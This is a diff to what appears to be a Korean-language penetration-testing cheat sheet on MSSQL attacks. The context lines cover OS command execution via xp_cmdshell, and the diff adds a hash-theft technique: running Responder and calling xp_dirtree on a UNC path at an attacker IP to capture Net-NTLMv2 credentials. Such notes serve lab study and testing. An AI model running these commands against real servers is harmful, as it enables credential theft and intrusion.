@@ -65,6 +65,16 @@ EXECUTE xp_cmdshell 'whoami';
 - `RECONFIGURE` - 변경한 설정을 즉시 적용
 - `xp_cmdshell` - SQL 쿼리에서 직접 OS 명령어를 실행하게 해주는 확장 저장 프로시저
 
+
+#### MSSQL Get Net-NTLMv2
+```bash
+sudo responder -I tun0 -v
+```
+
+```sql
+EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
+```
+
 ### MySQL
 
 #### Code Execution
